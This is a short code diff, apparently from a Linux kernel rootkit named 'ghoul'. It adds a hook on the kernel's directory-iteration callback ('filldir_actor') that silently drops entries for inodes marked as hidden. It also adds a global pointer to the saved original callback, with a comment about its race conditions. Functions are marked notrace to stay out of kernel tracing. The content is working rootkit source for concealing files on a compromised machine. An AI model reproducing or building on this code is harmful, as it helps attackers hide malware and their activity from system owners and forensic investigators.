@@ -8,6 +8,21 @@
 
 LIST_HEAD(hidden_inodes);
 
+/** 
+ * TODO: this should not be global!!!
+ * If iterate_dir is run on multiple CPUs concurrently,
+ * they will overrdie each other's saved actor.
+ * Moreover, even on a single CPU, an iteration can be interrupted by a context switch,
+ * and if the new task will also perform a directory iteration, it will override the actor.
+ * 
+ * To solve this, this should be a linked list that associates an actor with the PID that is using it.
+ * A given PID can not iterate more than one directory at a given time as its execution is synchronous.
+ * 
+ * Lookup times for this list are negligible because it is very unlikely
+ * that more than one iteration will take place at a given time.
+ */
+filldir_t orig_actor = NULL;
+
 notrace void hide_file_inode(unsigned long ino)
 {
     struct inode_list *inode_entry;
@@ -131,4 +146,21 @@ notrace void show_file_inode(const void __user *user_info)
 
     excluded_pid->pid = info.pid;
     list_add_tail(&excluded_pid->list, &hidden_inode->excluded_pids);
+}
+
+notrace int filldir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
+{
+    // call original actor unless inode should be hidden
+    if (orig_actor != NULL) {
+        if (!should_hide_inode(ino))
+            return orig_actor(ctx, name, namlen, offset, ino, d_type);
+        else
+            return 0;
+    }
+    
+    // oh no, original actor was not saved
+    else {
+        pr_err("ghoul: ERROR - original filldir actor was not saved\n");
+        return -EFAULT;
+    }
 }
